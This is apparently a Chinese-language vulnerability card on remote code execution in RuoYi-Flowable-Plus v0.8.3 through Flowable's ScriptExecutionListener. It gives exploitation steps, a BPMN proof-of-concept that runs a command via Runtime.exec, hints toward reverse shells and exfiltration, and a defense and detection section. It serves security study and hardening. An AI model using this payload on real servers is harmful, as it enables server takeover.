---
id: web-java-rce-flowable-script-execution-listener
title: Flowable ScriptExecutionListener：class 监听器填 script + language=js，流程启动时交给 JSR-223 脚本引擎执行命令
type: scenario
domain: web
path: web/java/rce
technique: flowable-script-execution-listener-js-rce
aliases:
- Flowable ScriptExecutionListener
- executionListener script
- flowable script language js
- BPMN 脚本监听器 RCE
- RuoYi-Flowable-Plus 脚本监听器
- Nashorn 流程引擎
tags:
- java
- flowable
- bpmn
- scriptengine
- nashorn
- rce
- ruoyi
- juel
cve: []
severity: high
confidence: high
affected_versions: RuoYi-Flowable-Plus v0.8.3
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V404
  verified_at: '2026-11-09T13:29:30+08:00'
  notes: 已对照原文方法一(类二)与图 12-14 核对：Java 类=org.flowable.engine.impl.bpmn.listener.ScriptExecutionListener，注入字段 script=var System = java.lang.Runtime.getRuntime().exec("calc")、language=js；注意截图中两字段类型均为字符串（原文正文写'选择表达式'与截图不符，卡片按截图采用字符串并给出 flowable:string，正确）；流程启动时 calc 弹出，但界面同时提示'流程启动错误'（命令已执行、流程随后报错），卡面表述为'命令执行'可接受。原文明确使用版本 v0.8.3，已 set-versions。无 sources/URL/文章ID；dedup 均 new。
---

## 一句话结论

Flowable 的执行监听器还有一种 `script` 实现类型：流程定义里可以指定脚本源码与语言（如 `script` + `language=js`），引擎在监听器触发时通过 JSR-223 `ScriptEngine` 执行该脚本。后台流程设计器若把该类型暴露出来，攻击者选择 Flowable 自带的 `org.flowable.engine.impl.bpmn.listener.ScriptExecutionListener` 作为 Java 类，注入 `script`（`var System = java.lang.Runtime.getRuntime().exec("calc");`）和 `language`（`js`）两个字段，流程启动即由脚本引擎执行命令；RuoYi-Flowable-Plus v0.8.3 后台实测可触发。

## 原理

- **ScriptExecutionListener 类**：`org.flowable.engine.impl.bpmn.listener.ScriptExecutionListener` 是 Flowable 提供的 `ExecutionListener` 实现，内部持有 `script` 与 `language` 字段；监听器 `notify` 时调用流程引擎的 `ScriptingEngines` 按 `language` 选择 JSR-223 引擎并执行 `script` 源码。
- **注入路径**：在 BPMN 里以 class 方式声明监听器（`flowable:class="org.flowable.engine.impl.bpmn.listener.ScriptExecutionListener"`），并用 `flowable:field` 注入 `script`（字符串）和 `language`（字符串）。`ClassDelegate` 反射实例化该类后，`applyFieldDeclaration` 把两个字段值写入；监听器触发时脚本被执行。
- **脚本引擎能力**：JDK 8 自带 Nashorn（`getEngineByName("js")`），脚本中可以直接写 `java.lang.Runtime.getRuntime().exec(...)` 或 `Java.type('java.lang.Runtime')`，默认没有类访问限制；因此脚本字段等价于任意 Java 代码执行。JDK 15+ 移除了 Nashorn，但目标若另有 Groovy/JavaScript 引擎（如 Nashorn standalone、Rhino、Groovy），同样可执行命令。
- **与表达式监听器的区别**：`expression` 类型走 JUEL 求值；`script` 类型走脚本引擎，语法是 JavaScript/Groovy 等，且 payload 放在 `script` 字段而不是 `implementation`。当 `expression` 被禁用或 JUEL 反射链被限制时，脚本监听器是另一条可达路径。
- **为什么后台可控**：RuoYi-Flowable-Plus 的流程设计器把监听器类型/字段做成可视化表单，后台用户能选择“Java 类”并填入类名与字段；保存并部署流程后，发起流程触发 start 监听器，脚本在服务器上执行。

## 触发条件

- 目标使用 Flowable 6.x（调试环境为 flowable-engine 6.8.0），且 classpath 中存在 `org.flowable.engine.impl.bpmn.listener.ScriptExecutionListener`。
- 运行环境提供 JSR-223 脚本引擎，`language` 对应的引擎可用（如 JDK 8 的 `js`/Nashorn、引入 Groovy 依赖时的 `groovy`）。
- 攻击者能访问流程设计/部署功能（后台账号，具备流程模型与部署权限）。
- 部署/发起流程时未禁用 `script` 类型监听器或脚本字段。

## 利用步骤

1. 登录后台，新建流程模型并进入设计器。
2. 创建开始事件，添加“执行监听器”：
   - 事件类型：`start`
   - 监听器类型：`Java 类`
   - Java 类：`org.flowable.engine.impl.bpmn.listener.ScriptExecutionListener`
   - 注入字段 1：`script`，字段类型：`字符串`，值：`var System = java.lang.Runtime.getRuntime().exec("calc");`
   - 注入字段 2：`language`，字段类型：`字符串`，值：`js`
3. 保存流程并点击“部署”（不部署则旧版本流程定义不生效）。
4. 进入“新建流程”发起该流程并提交，脚本监听器执行，命令在服务器上运行。
5. 需要回显/外带时，把脚本换成调用 `java.lang.Runtime` 写文件、`java.net.URL`/`HttpURLConnection` 外带、或反弹 shell 的等价代码。

## PoC

等价 BPMN 片段：

```xml
<startEvent id="start">
  <extensionElements>
    <flowable:executionListener event="start"
        class="org.flowable.engine.impl.bpmn.listener.ScriptExecutionListener">
      <flowable:field name="script">
        <flowable:string><![CDATA[var System = java.lang.Runtime.getRuntime().exec("calc");]]></flowable:string>
      </flowable:field>
      <flowable:field name="language">
        <flowable:string>js</flowable:string>
      </flowable:field>
    </flowable:executionListener>
  </extensionElements>
</startEvent>
```

脚本内容按目标引擎语法调整：Nashorn 可直接访问 `java.lang`；Groovy 可用 `"calc".execute()`；无法直接访问 Java 类时参考对应脚本引擎的沙箱绕过手法。

## 变体与关联

- **expression 监听器**：同一执行监听器功能的另一种实现类型，走 JUEL 求值（见表达式监听器卡）；两者可以互为备用路径。
- **class + Expression 字段**：若 `script` 字段被过滤，可尝试 class 监听器 + Expression 字段（NoOpServiceTask）路径（见关联卡）。
- **脚本引擎类型**：`language` 值取决于 classpath 中可用的 JSR-223 引擎——`js`（Nashorn/Rhino）、`groovy`、`python`（Jython）等；不同引擎的 API 与沙箱限制不同。
- **其他 Flowable 脚本入口**：ScriptTask、脚本执行监听器、执行监听器中的 script 类型等都可把脚本交给同一 `ScriptingEngines`，审计时应统一排查。

## 检测与防御

- **禁止脚本监听器**：部署 BPMN 时白名单限制监听器类型，禁止 `script` 类型与 `ScriptExecutionListener` 类；对 `flowable:field` 的 script 字段做内容校验。
- **移除/限制脚本引擎**：生产环境不引入不必要的 JSR-223 引擎；升级到移除 Nashorn 的 JDK 或在引擎级禁用类访问（Nashorn 的 `--no-java`、Groovy 的 SecureASTCustomizer 等）。
- **权限与审计**：流程设计、部署、发起分别做 RBAC，记录操作人；对新增/修改的 BPMN XML 与部署版本做审计留档。
- **监控**：监控流程部署与启动事件，告警包含 `ScriptExecutionListener`/`language` 字段的流程定义；定期扫描部署表中的 XML。
- **应急**：删除可疑流程定义/部署版本，排查服务器上由脚本引擎发起的子进程与外联行为。
- 与表达式监听器共用同一套后台入口与部署机制，排查时应把 `class`、`expression`、`delegateExpression`、`instance`、`script` 五种实现类型一起审计，避免只封堵其中一种。
